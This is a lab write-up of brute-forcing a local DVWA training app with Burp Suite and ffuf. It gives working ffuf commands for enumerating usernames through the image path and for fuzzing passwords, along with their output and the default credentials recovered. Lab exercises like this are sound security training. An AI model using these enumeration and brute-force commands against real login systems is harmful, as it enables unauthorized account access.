# DVWA Brute Force Lab — Username & Password Discovery

## Objective

Using a local DVWA instance (security level set to **Low**), identify all DVWA user
accounts through fuzzing — both usernames and passwords — using Burp Suite for
request inspection and `ffuf` for the actual fuzzing.

## Environment

- DVWA running locally at `http://127.0.0.1:42001`
- Attacker machine: Kali Linux (VirtualBox VM)
- Tools: Burp Suite Community Edition, `ffuf`
- DVWA Security level: **Low**

---

## Step 1 — Logging in and setting security to Low

Before any fuzzing could happen, I logged into DVWA with the known default
credentials (`admin` / `password`) once, purely to set **DVWA Security → Low**.
This is a necessary bootstrap step — you need one working credential to configure
the lab before "discovering" credentials for the other accounts, so I'm noting it
here rather than counting it as part of the brute-force evidence itself.

## Step 2 — Inspecting the login request with Burp Suite

With Burp's built-in browser open (traffic automatically routed through Burp's
proxy, so no manual proxy configuration was needed), I navigated to the **Brute
Force** page and submitted a dummy login (`test` / `test`) to capture a baseline
request.

In **Proxy → HTTP History**, I found the request and inspected both panels:

- **Method:** `GET`
- **URL pattern:** `/vulnerabilities/brute/?username=test&password=test&Login=Login`
- **Cookie header:** `PHPSESSID=<session>; security=low`
- **Failure response text:** `"Username and/or password incorrect."`

This confirmed three things I needed before fuzzing:
1. The exact parameter names (`username`, `password`, `Login`) to target with `FUZZ`.
2. The session cookie required to authenticate as a "logged in" DVWA user (Brute
   Force requires an active session even though it's testing other accounts).
3. What a *failed* login response looks like, so I could later tell `ffuf` to
   filter it out and surface only the different (successful) response.

![Burp request showing session cookie](burp_cookies.png)

One practical issue I ran into here: DVWA's session cookie periodically expired
or became stale (especially after a VM restart), and I had to re-capture a fresh
`PHPSESSID` from Burp several times throughout the exercise. I'd re-do a dummy
login on the Brute Force page and grab the updated cookie each time a fuzzing run
started behaving oddly.

---

## Step 3 — Discovering usernames via image endpoint fuzzing

DVWA stores a profile picture for each user at a predictable path:
`/hackable/users/<username>.jpg`. This means usernames can be enumerated without
ever touching the login form, just by fuzzing that path and checking which
requests return `HTTP 200` (image exists) vs `404` (it doesn't).

### Wordlist choice

I initially planned to use SecLists, but it wasn't installed on this Kali image,
and installing it would have taken a while to download. Since DVWA only ships
with a small, well-known set of default accounts, I built a short custom
wordlist instead — including the known defaults plus a few plausible decoys so
the list wasn't just "typing in the answer":

```bash
echo -e "admin\ngordonb\n1337\npablo\nsmithy\nadmin1\nuser\ntest\nroot\nguest" > ~/dvwa-userlist.txt
```

### Command

```bash
ffuf -u http://127.0.0.1:42001/hackable/users/FUZZ.jpg \
  -w ~/dvwa-userlist.txt \
  -mc 200 -fc 404
```

### Result

All 5 valid DVWA usernames were found with `HTTP 200`:

| Username | Status | Size |
|---|---|---|
| admin   | 200 | 3543 |
| gordonb | 200 | 3063 |
| 1337    | 200 | 3681 |
| pablo   | 200 | 2961 |
| smithy  | 200 | 4382 |

![ffuf output showing discovered usernames](ffuf_user_fuzz.png)

`admin` was already known (it's the account I used to configure the lab), so the
remaining 4 — `gordonb`, `1337`, `pablo`, `smithy` — were the actual targets for
password brute-forcing.

---

## Step 4 — Password fuzzing

### First attempt: rockyou.txt (failed — server overload)

My first instinct was to fuzz each user's password against the full
`/usr/share/wordlists/rockyou.txt` (~14 million entries), using the failure
response size as a filter:

```bash
ffuf -u "http://127.0.0.1:42001/vulnerabilities/brute/?username=gordonb&password=FUZZ&Login=Login" \
  -w /usr/share/wordlists/rockyou.txt \
  -H "Cookie: PHPSESSID=<session>; security=low" \
  -fs 4699
```

This did **not** work. `ffuf`'s default thread count fired requests far faster
than DVWA's local dev server could handle, and the run showed **every single
request erroring out** rather than returning real HTTP responses:

```
:05:01] :: Errors: 4191224
```

A `curl` check confirmed DVWA had actually gone down under the load:

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:42001/login.php
# returned: 000
```

After DVWA recovered (it came back on its own after a short wait — no service
restart needed), I switched strategy.

### Second attempt: custom targeted wordlist (worked)

Instead of brute-forcing blindly against millions of entries, I built a small,
focused password wordlist and reduced `ffuf`'s thread count to avoid overloading
the server again:

```bash
echo -e "password\nabc123\ncharley\nletmein\n123456\nadmin\nqwerty\npassword123\ndvwa\nwelcome" > ~/dvwa-passlist.txt
```

```bash
ffuf -u "http://127.0.0.1:42001/vulnerabilities/brute/?username=<user>&password=FUZZ&Login=Login" \
  -w ~/dvwa-passlist.txt \
  -H "Cookie: PHPSESSID=<session>; security=low" \
  -t 5
```

Important detail I discovered along the way: I **did not** rely on `-fs` to
filter out failures up front. Instead, I first ran the fuzz with no filter at
all, so I could see every response size side by side. This mattered because the
"failure" response size actually varies depending on the *username* being
tested (DVWA reflects the username back into the page), so a single filter size
captured from one user's baseline doesn't reliably apply to another user. Once I
could see all 10 results together, the correct password stood out immediately
as the one entry with a different response size and word count than the rest.

#### gordonb

```
letmein      [Status: 200, Size: 4436, Words: 179]
charley      [Status: 200, Size: 4436, Words: 179]
123456       [Status: 200, Size: 4436, Words: 179]
abc123       [Status: 200, Size: 4478, Words: 183]   <-- outlier
admin        [Status: 200, Size: 4436, Words: 179]
password     [Status: 200, Size: 4436, Words: 179]
...
```

`abc123` stood out as the only response with a different size/word count —
confirmed as the correct password.

![ffuf password fuzz result for gordonb](ffuf_password_fuzz_gordonb.png)

#### 1337

```
password     [Status: 200, Size: 4436, Words: 179]
letmein      [Status: 200, Size: 4436, Words: 179]
abc123       [Status: 200, Size: 4436, Words: 179]
charley      [Status: 200, Size: 4472, Words: 183]   <-- outlier
...
```

![ffuf password fuzz result for 1337](ffuf_password_fuzz_1337.png)

#### pablo

```
letmein      [Status: 200, Size: 4474, Words: 183]   <-- outlier
123456       [Status: 200, Size: 4436, Words: 179]
admin        [Status: 200, Size: 4436, Words: 179]
...
```

![ffuf password fuzz result for pablo](ffuf_password_fuzz_pablo.png)

#### smithy

```
letmein      [Status: 200, Size: 4436, Words: 179]
password     [Status: 200, Size: 4476, Words: 183]   <-- outlier
admin        [Status: 200, Size: 4436, Words: 179]
...
```

![ffuf password fuzz result for smithy](ffuf_password_fuzz_smithy.png)

---

## Step 5 — Verifying each credential

For every password `ffuf` flagged as the outlier, I manually logged in through
the browser via the Brute Force form to confirm it actually worked, rather than
trusting the response-size signal alone.

**gordonb / abc123** — confirmed, page displayed:
`"Welcome to the password protected area gordonb"` with avatar image.

![Successful login as gordonb](login_success_gordonb.png)

**1337 / charley** — confirmed, page displayed:
`"Welcome to the password protected area 1337"` with avatar image.

![Successful login as 1337](login_success_1337.png)

**pablo / letmein** — confirmed, page displayed:
`"Welcome to the password protected area pablo"` with avatar image.

![Successful login as pablo](login_success_pablo.png)

**smithy / password** — confirmed, page displayed:
`"Welcome to the password protected area smithy"` with avatar image.

![Successful login as smithy](login_success_smithy.png)

---

## Final Results

| Username | Password | Found via | Wordlist (full path) | Notes |
|---|---|---|---|---|
| admin   | password | Known beforehand (used to configure DVWA) | — | Not brute-forced; this was the bootstrap credential used to set security=low |
| gordonb | abc123   | ffuf password fuzz | `/home/kali/dvwa-passlist.txt` | rockyou.txt first attempted but overloaded DVWA's server (all requests errored); switched to custom targeted list |
| 1337    | charley  | ffuf password fuzz | `/home/kali/dvwa-passlist.txt` | same targeted list, same method |
| pablo   | letmein  | ffuf password fuzz | `/home/kali/dvwa-passlist.txt` | same targeted list, same method |
| smithy  | password | ffuf password fuzz | `/home/kali/dvwa-passlist.txt` | same targeted list, same method |

Usernames (`admin`, `gordonb`, `1337`, `pablo`, `smithy`) were all discovered via:

```
ffuf -u http://127.0.0.1:42001/hackable/users/FUZZ.jpg -w /home/kali/dvwa-userlist.txt -mc 200 -fc 404
```

---

## What I'd do differently

- Install SecLists properly ahead of time rather than reaching for it mid-lab,
  so I'm not stuck choosing between a slow download and building my own list
  under time pressure.
- Throttle `ffuf` (`-t`, or add `-p` for a delay) from the very first run against
  any wordlist larger than a few hundred entries — the local DVWA dev server
  clearly can't handle high concurrency, and discovering that by crashing it
  cost real time.
- Capture a fresh baseline failure response *per username* before fuzzing, since
  DVWA reflects the username into the page and changes the failure response
  size accordingly — a single global filter size is not reliable across users.
